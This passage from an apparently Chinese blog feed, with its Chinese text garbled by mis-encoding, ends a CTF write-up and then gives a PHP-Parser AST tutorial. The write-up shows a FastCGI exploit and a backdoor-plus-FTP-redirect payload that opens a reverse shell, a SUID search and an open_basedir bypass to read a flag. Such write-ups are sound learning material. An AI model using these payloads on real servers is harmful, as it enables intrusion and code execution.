$_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åæ„é€ æ¶æ„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add_api.php?backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;aaa@xxx.xx.xx.xxx:23&#x2F;123&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>å½“ ftp å»ºç«‹è¿æ¥åï¼Œä¼šé€šè¿‡ ftp passive mode æ¨¡å¼å°† payload é‡å®šå‘åˆ°ç›®æ ‡ä¸»æœºæœ¬åœ° 9001 ç«¯å£çš„ php-fpm ä¸Šï¼Œå¹¶æˆåŠŸåå¼¹shellï¼š</p><p><img src="https://i.loli.net/2021/05/03/BWi8gjseEa93w6S.png"></p><p>ä½†æ˜¯ğŸ‘´å¹¶æ²¡æœ‰è¯»å– flag çš„æƒé™ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ææƒï¼Œæœ€å¸¸è§çš„ä¾¿æ˜¯ä½¿ç”¨ suid ææƒï¼š</p><p>æŸ¥çœ‹å…·æœ‰ suid çš„å‘½ä»¤ï¼š<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>åœ¨ğŸ‘´å¤ç°çš„æ—¶å€™æ­»æ´»æ²¡æœ‰æŸ¥å‡º  /usr/local/bin/php ï¼Œæ‰€ä»¥å€Ÿç”¨äº†åˆ«çš„å¸ˆå‚…çš„å›¾ï¼š</p><p><img src="https://i.loli.net/2021/05/03/1Eez7giZrwmFf2u.png"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›å…¥äº¤äº’æ¨¡å¼æ‰§è¡Œä»£ç ï¼Œå¾—åˆ° flagï¼š</p><p><code>chdir(&#39;Du1&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;);</code></p><p><img src="https://i.loli.net/2021/05/03/VD4goPYEXUA9Gmb.png"></p><p>å®Œäº‹</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºPHP-ASTè¿™ä»¶äº‹</title>
      <link href="2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
      <url>2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h2><p>ğŸ‘´æƒ³å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–å¯»æ‰¾ php ååºåˆ—åŒ–é“¾çš„å°ç©æ„ã€‚</p><p>æœ€å¼€å§‹å†™é¡¹ç›®çš„é©±åŠ¨æ˜¯é»„æ€»è¯´è¦å‡†å¤‡å›½èµ›çš„é¡¹ç›®èµ›ï¼Œç„¶åè¡¨ç¤ºâ€œä»Šå¹´ä¸èƒ½åƒå»å¹´ä¸€æ ·é¸½æ‰äº†â€ï¼Œå†ç„¶ååœ¨ä¸€æ¬¡å¼€ä¼šä¸Šï¼ŒåŒæ–¹ä¹Ÿæ˜¯ç›¸è§†ä¸€ç¬‘ï¼šâ€œå˜¿å˜¿ï¼Œå˜¿å˜¿â€ï¼Œä¹Ÿå°±è¿™ä¹ˆæç½®ä¸‹æ¥äº†ã€‚ç„¶åè¯´è¦æˆ‘ä»¬å‡†å¤‡å¥½å¸¦å¥½ä¸‹ä¸€å±Šï¼Œè®©ä»–ä»¬æï¼Œç„¶åçœ‹äº†çœ‹è¿™ç¾¤å…”å´½å­ï¼Œå½³äºâ€¦â€¦è¿˜è¿œç€ã€‚ç„¶åç°åœ¨æ˜¯ç¡®å®è‡ªå·±æœ‰äº†æƒ³æçš„åŠ¨åŠ›ï¼ˆåŸå› ä¸æ˜ï¼‰ï¼Œçªç„¶ï¼Œæ¬¸å°±å¾ˆæƒ³æäº†ï¼Œæ‰€ä»¥å°±å†æ¡èµ·æ¥ã€‚</p><p>ä½†æ˜¯å¯¹äºå¤§æ¦‚çš„é¡¹ç›®æµç¨‹è¿˜æ˜¯è›®ä¸ç†è§£ï¼Œåˆæ˜¯è‡ªå·±ä¸€ä¸ªäººæï¼Œå°±å…ˆæ‘¸ç´¢ç ”ç©¶ä¸€ä¸‹ã€‚åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆä¹…æ‰¾åˆ°äº† <code>PHP-Parser</code> è¿™ä¸ªå·¥å…·ï¼Œæ˜¯ä¸“é—¨åš PHP AST çš„ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹å§</p><hr><p>PHP-Parser çš„é¡¹ç›®ä¸»é¡µæ˜¯ <a href="https://github.com/nikic/PHP-Parser%E3%80%82%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%A4%9A%E7%89%88%E6%9C%AC%E7%9A%84">https://github.com/nikic/PHP-Parserã€‚å¯ä»¥å¯¹å¤šç‰ˆæœ¬çš„</a> PHP è¿›è¡Œå®Œç¾è§£æï¼Œç”Ÿæˆä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘</p><p>å¯¹äºè¯æ³•åˆ†æï¼ŒPHP æœ‰ä¸ªå†…ç½®å‡½æ•° <code>token_get_all()</code> å¯ä»¥ç”¨æ¥è·å– TOKENSï¼Œä½œä¸ºè¯­æ³•åˆ†æçš„è¾“å…¥ï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®ä¹Ÿæ˜¯ç”¨çš„ <code>token_get_all()</code> ç”Ÿæˆçš„ token æµ</p><blockquote><p>ä¸è¿‡è¯è¯´å›æ¥ï¼ŒASTï¼Œå³ Abstract Syntax Treeï¼Œä¹Ÿå°±æ˜¯æŠ½è±¡è¯­æ³•æ ‘ï¼Œå®ƒæ˜¯æºä»£ç è¯­æ³•ç»“æ„çš„ä¸€ç§æŠ½è±¡è¡¨ç¤ºï¼Œå¯ä»¥å°†ä½ æ‰€å†™çš„çš„ä»£ç ç”¨æ ‘çŠ¶ç»“æ„åŒ–è¡¨ç°å‡ºæ¥</p></blockquote><hr><p>é‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€æ•´å§</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å¯ä»¥ä½¿ç”¨ PHP çš„åŒ…ç®¡ç†å·¥å…· composer æ·»åŠ ï¼Œåœ¨é¡¹ç›®ç›®å½•æ‰§è¡Œå‘½ä»¤ <code>php composer.phar require nikic/php-parser</code> å³å¯ï¼Œå¦‚æœæ²¡æœ‰ä¸‹è½½ composerï¼Œå°±å…ˆæ‰§è¡Œ <code>curl -s http://getcomposer.org/installer | php</code> æ¥å®‰è£…ã€‚</p><h3 id="å¼€æ"><a href="#å¼€æ" class="headerlink" title="å¼€æ"></a>å¼€æ</h3><p>è·Ÿç€<a href="https://github.com/nikic/PHP-Parser/tree/master/doc">å®˜æ–¹æ–‡æ¡£</a> å­¦äº†ã€‚</p><h4 id="åŸºæœ¬ç»„æˆè¯­æ³•"><a href="#åŸºæœ¬ç»„æˆè¯­æ³•" class="headerlink" title="åŸºæœ¬ç»„æˆè¯­æ³•"></a>åŸºæœ¬ç»„æˆè¯­æ³•</h4><h5 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h5><p>å¦‚æœè¦ä½¿ç”¨è¿™ä¸ªåº“çš„è¯ï¼Œé¦–å…ˆè¦å°† composer ç”Ÿæˆçš„è‡ªåŠ¨è£…å¸¦å™¨ç»™åŒ…å«è¿›æ¥ï¼Œå¯ä»¥ä½¿ç”¨ <code>require &#39;path/to/vendor/autoload.php&#39;;</code>ã€‚</p><p>å¦å¤–ï¼Œä½ å¯ä»¥æŠŠ <code>xdebug.max_nesting_level</code> è®¾ç½®ä¸ºæ›´é«˜çš„å€¼ï¼š<code>ini_set(&#39;xdebug.max_nesting_level&#39;, 3000);</code>ã€‚</p><p>è¿™æ ·å¯ä»¥ç¡®ä¿éå†é«˜åº¦åµŒå¥—çš„èŠ‚ç‚¹æ ‘æ—¶ä¸ä¼šå‡ºç°é”™è¯¯ï¼Œä½†æ˜¯æœ€å¥½å®Œå…¨ç¦ç”¨ Xdebugï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“ä½¿è¯¥åº“çš„è¿è¡Œé€Ÿåº¦æ…¢äº”å€ä»¥ä¸Šã€‚</p><h5 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h5><p>æˆ‘ä»¬å¯ä»¥åˆ›é€ ä¸€ä¸ª parserï¼ˆè§£æå™¨ï¼‰å®ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå·¥å‚ç±»æ¥å—ä¸€ä¸ªå‚æ•°ä»¥åŒºåˆ«å¯¹å¾…ä¸åŒç‰ˆæœ¬çš„ PHPï¼š</p><table><thead><tr><th>Kind</th><th>Behavior</th></tr></thead><tbody><tr><td>ParserFactory::PREFER_PHP7</td><td>å°è¯•å°†ä»£ç è§£æä¸ºPHP7ã€‚å¦‚æœå¤±è´¥ï¼Œè¯·å°è¯•å°†å…¶è§£æä¸ºPHP 5</td></tr><tr><td>ParserFactory::PREFER_PHP5</td><td>å°è¯•å°†ä»£ç è§£æä¸ºPHP5ã€‚å¦‚æœå¤±è´¥ï¼Œè¯·å°è¯•å°†å…¶è§£æä¸ºPHP 7</td></tr><tr><td>ParserFactory::ONLY_PHP7</td><td>å°†ä»£ç è§£æä¸ºPHP7</td></tr><tr><td>ParserFactory::ONLY_PHP5</td><td>å°†ä»£ç è§£æä¸ºPHP5</td></tr></tbody></table><p>é™¤éæœ‰æ›´å¥½çš„é€‰æ‹©ï¼Œä¸€èˆ¬é»˜è®¤ç”¨ <code>PREFER_PHP7</code>ï¼Œ<code>create()</code> æ–¹æ³•å¯ä»¥é€‰æ‹©æ€§åœ°æ¥å— <code>Lexer</code> ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™ä¸ªæˆ‘ä»¬å§‘ä¸”ä¸åšç ”ç©¶ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæˆ‘ä»¬éœ€è¦ AST åŒ–çš„ PHP ä»£ç ä¼ é€’ç»™ parse æ–¹æ³•ï¼Œå¦‚æœé‡åˆ°äº†è¯­æ³•é”™è¯¯ï¼Œå°†ä¼šæŠ›å‡º <code>PhpParser\Error</code> å¼‚å¸¸ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = &lt;&lt;&lt;<span class="string">&#x27;CODE&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLine</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">printLine(<span class="string">&#x27;Hello World!!!&#x27;</span>);</span><br><span class="line">CODE;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$stmts</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">    <span class="comment">// $stmts is an array of statement nodes</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Parse Error: &#x27;</span>, <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª parser å®ä¾‹å¯ä»¥é‡å¤ä½¿ç”¨ä»¥è§£æå¤šä¸ªæ–‡ä»¶ã€‚</p><h5 id="èŠ‚ç‚¹è½¬å‚¨"><a href="#èŠ‚ç‚¹è½¬å‚¨" class="headerlink" title="èŠ‚ç‚¹è½¬å‚¨"></a>èŠ‚ç‚¹è½¬å‚¨</h5><p>å¦‚æœè¦ä»¥äººå¯è¯»çš„æ–¹å¼å»è½¬å‚¨ AST çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>NodeDumper</code>ï¼›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nodeDumper</span> = <span class="keyword">new</span> NodeDumper;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nodeDumper</span>-&gt;dump(<span class="variable">$stmts</span>), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯¹äºä¹‹å‰çš„å®ä¾‹ï¼Œå°†ä¼šè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    0: Stmt_Function(</span><br><span class="line">        attrGroups: array(</span><br><span class="line">        )</span><br><span class="line">        byRef: false</span><br><span class="line">        name: Identifier(</span><br><span class="line">            name: printLine</span><br><span class="line">        )</span><br><span class="line">        params: array(</span><br><span class="line">            0: Param(</span><br><span class="line">                attrGroups: array(</span><br><span class="line">                )</span><br><span class="line">                flags: 0</span><br><span class="line">                type: null</span><br><span class="line">                byRef: false</span><br><span class="line">                variadic: false</span><br><span class="line">                var: Expr_Variable(</span><br><span class="line">                    name: msg</span><br><span class="line">                )</span><br><span class="line">                default: null</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        returnType: null</span><br><span class="line">        stmts: array(</span><br><span class="line">            0: Stmt_Echo(</span><br><span class="line">                exprs: array(</span><br><span class="line">                    0: Expr_Variable(</span><br><span class="line">                        name: msg</span><br><span class="line">                    )</span><br><span class="line">                    1: Scalar_String(</span><br><span class="line">                        value: </span><br><span class="line">                    </span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    1: Stmt_Expression(</span><br><span class="line">        expr: Expr_FuncCall(</span><br><span class="line">            name: Name(</span><br><span class="line">                parts: array(</span><br><span class="line">                    0: printLine</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            args: array(</span><br><span class="line">                0: Arg(</span><br><span class="line">                    name: null</span><br><span class="line">                    value: Scalar_String(</span><br><span class="line">                        value: Hello World!!!</span><br><span class="line">                    )</span><br><span class="line">                    byRef: false</span><br><span class="line">                    unpack: false</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>php-parse</code> è„šæœ¬ï¼Œä½¿ç”¨æ–‡ä»¶åæˆ–è€…ä»£ç å­—ç¬¦ä¸²è°ƒç”¨å®ƒæ¥è·å– ASTï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vendor/bin/php-parse test.php</span><br><span class="line">vendor/bin/php-parse &quot;&lt;?php foo();&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/8YoSePjMbZUhdXm.png"></p><p>å¦‚æœæƒ³è¦å¿«é€Ÿè·å– AST ä¸­æŸäº›è¯­æ³•çš„è¡¨è¾¾æ–¹å¼çš„è¯ï¼Œè¿™æ ·å°±å¾ˆå¯ã€‚</p><h5 id="èŠ‚ç‚¹ğŸŒ³ç»“æ„"><a href="#èŠ‚ç‚¹ğŸŒ³ç»“æ„" class="headerlink" title="èŠ‚ç‚¹ğŸŒ³ç»“æ„"></a>èŠ‚ç‚¹ğŸŒ³ç»“æ„</h5><p>è§‚å¯Ÿä¸Šé¢çš„èŠ‚ç‚¹è½¬å‚¨ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸Šé¢ä»£ç ä¸­çš„ <code>$stms</code> æ˜¯ä¸¤ä¸ªèŠ‚ç‚¹çš„æ•°ç»„ï¼Œä¸€ä¸ª <code>Stmt_Function</code> å’Œä¸€ä¸ª <code>Stmt_Expression</code> èŠ‚ç‚¹ï¼Œå®ƒä»¬æ‰€å¯¹åº”çš„ç±»åç§°ä¸ºï¼š</p><ul><li><code>Stmt_Function</code> -&gt; <code>PhpParser\Node\Stmt\Function_</code></li><li><code>Stmt_Expression</code> -&gt; <code>PhpParser\Node\Stmt\Expression</code></li></ul><p>å¯èƒ½æœ‰äººæ³¨æ„åˆ°äº† Function ç±»çš„æœ€åé¢å¤šäº†ä¸€ä¸ª <code>_</code>ï¼Œä½†æ˜¯ Function æ˜¯ä¸€ä¸ªä¿ç•™å…³é”®å­—ï¼Œè¯¥åº“ä¸­çš„è®¸å¤šèŠ‚ç‚¹ç±»åç§°éƒ½å¸¦æœ‰å°¾éš <code>_</code>ï¼Œä»¥é¿å…ä¸å…³é”®å­—å†²çªã€‚</p><p>å› ä¸º PHP æ˜¯ä¸€ç§å¤§å‹è¯­è¨€ï¼Œæ‰€ä»¥å¤§æ¦‚æœ‰140å¤šä¸ªä¸åŒçš„èŠ‚ç‚¹ï¼Œä¸ºäº†æ›´å¥½åœ°ä½¿ç”¨å®ƒä»¬ï¼Œå°†å®ƒä»¬åˆ†ä¸ºäº†ä¸‰ç±»ï¼š</p><ul><li><code>PhpParser\Node\Stmt</code> æ˜¯è¯­å¥èŠ‚ç‚¹ï¼Œå³ä¸è¿”å›å€¼å¹¶ä¸”ä¸èƒ½å‡ºç°åœ¨è¡¨è¾¾å¼ä¸­çš„è¯­è¨€æ„é€ ï¼Œä¾‹å¦‚ç±»å®šä¹‰å°±æ˜¯ä¸€ä¸ªè¯­å¥ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è¿”å›å€¼æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æ„é€ åƒ <code>func(class A &#123;&#125;);</code> è¿™æ ·çš„è¯­å¥</li></ul><ul><li><code>PhpParser\Node\Expr</code> æ˜¯è¡¨è¾¾å¼èŠ‚ç‚¹ï¼Œå³è¿”å›å€¼çš„è¯­è¨€æ„é€ ï¼Œå› æ­¤å¯ä»¥åœ¨å…¶ä»–è¡¨è¾¾å¼ä¸­å‡ºç°ï¼Œè¡¨è¾¾å¼çš„å®ä¾‹å¦‚ï¼š<ul><li><code>$var</code> (<code>PhpParser\Node\Expr\Variable</code>)</li><li><code>func()</code> (<code>PhpParser\Node\Expr\FuncCall</code>)</li></ul></li><li><code>PhpParser\Node\Scalar</code> æ˜¯è¡¨ç¤ºæ ‡é‡å€¼çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚ <code>&#39;string&#39;</code> (<code>PhpParser\Node\Scalar\String_</code>)ï¼Œ<code>0</code> (<code>PhpParser\Node\Scalar\LNumber</code>ï¼‰æˆ–è€…é­”æœ¯å¸¸æ•°æ¯”å¦‚ <code>__FILE__</code> (<code>PhpParser\Node\Scalar\MagicConst\File</code>)ï¼Œæ‰€æœ‰çš„<code>PhpParser\Node\Scalars</code>éƒ½æ‰©å±•äº†<code>PhpParser\Node\Expr</code>ï¼Œå› ä¸ºæ ‡é‡ä¹Ÿæ˜¯è¡¨è¾¾å¼ã€‚</li><li>è¿™ä¸¤ä¸ªç»„éƒ½ä¸å­˜åœ¨æŸäº›èŠ‚ç‚¹ï¼Œæ¯”å¦‚åç§°ï¼ˆ<code>PhpParser\Node\Name</code>ï¼‰å’Œè°ƒç”¨å‚æ•°ï¼ˆ<code>PhpParser\Node\Arg</code>ï¼‰çš„èŠ‚ç‚¹ã€‚</li></ul><p><code>Node\Stmt\Expression</code>èŠ‚ç‚¹æœ‰ç‚¹ä»¤äººè¿·æƒ‘ï¼Œå› ä¸ºå®ƒæ—¢æœ‰æœ¯è¯­ statement åˆæœ‰ expressionï¼Œè¿™ä¸ªèŠ‚ç‚¹æœ‰åˆ«äºè¢«ç§°ä¸º <code>Node\Expr</code> çš„ exprï¼Œæ˜¯ä¸€ä¸ªç”±è¡¨è¾¾å¼ <code>Node\Stmt\Expression</code> ä»£è¡¨çš„åŒ…å« expr ä½œä¸ºå­èŠ‚ç‚¹çš„ expression statementã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PROJECT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è°ˆSQLæ³¨å…¥</title>
      <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
      
